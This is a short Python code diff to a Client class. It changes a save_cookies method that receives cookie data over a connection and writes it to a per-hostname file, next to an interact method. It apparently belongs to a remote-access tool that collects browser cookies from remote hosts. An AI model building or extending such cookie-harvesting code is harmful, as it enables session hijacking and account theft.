@@ -352,11 +352,11 @@ class Client:
 		return
 
 	def save_cookies(self):
-		cookies = json.loads(self.recv().split(chr(253))[0])
+		cookies = self.recv().split(chr(1))[0]
 		with open("cookies_"+self.hostname, "w") as f:
-			for website in cookies.keys():
-				f.write("Website: "+website)
-				pass
+			f.write(cookies)
+			
+		return
 
 	def interact(self):
 		self.interacting = True
